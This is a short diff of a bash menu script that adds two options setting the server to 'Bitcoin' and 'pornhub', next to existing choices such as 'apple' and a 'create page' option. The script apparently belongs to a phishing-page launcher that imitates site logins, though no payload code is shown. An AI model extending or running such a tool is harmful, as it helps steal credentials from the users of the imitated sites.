@@ -220,6 +220,14 @@ elif [[ $option == 40 ]]; then
 server="apple"
 start
 
+elif [[ $option == 41 ]]; then
+server="Bitcoin"
+start
+
+elif [[ $option == 42 ]]; then
+server="pornhub"
+start
+
 elif [[ $option == 99 ]]; then
 server="create"
 createpage
